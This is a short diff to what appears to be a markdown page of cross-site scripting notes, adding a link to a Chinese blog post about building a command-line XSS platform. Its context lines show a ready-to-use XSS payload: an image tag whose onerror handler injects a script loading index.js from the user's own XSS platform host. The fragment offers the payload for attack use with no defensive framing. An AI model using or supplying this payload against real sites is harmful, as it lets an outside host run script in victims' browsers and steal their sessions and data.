@@ -30,3 +30,6 @@ Eg.
 Finally, you can try the following pyaload :
 
 `<img src=x onerror=with(document)body.appendChild(document.createElement('script')).src="https://<your XSSPlatform ip>/index.js"></img>`
+
+[渗透工具开发——XSS平台的命令行实现](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91-XSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AE%9E%E7%8E%B0)
+
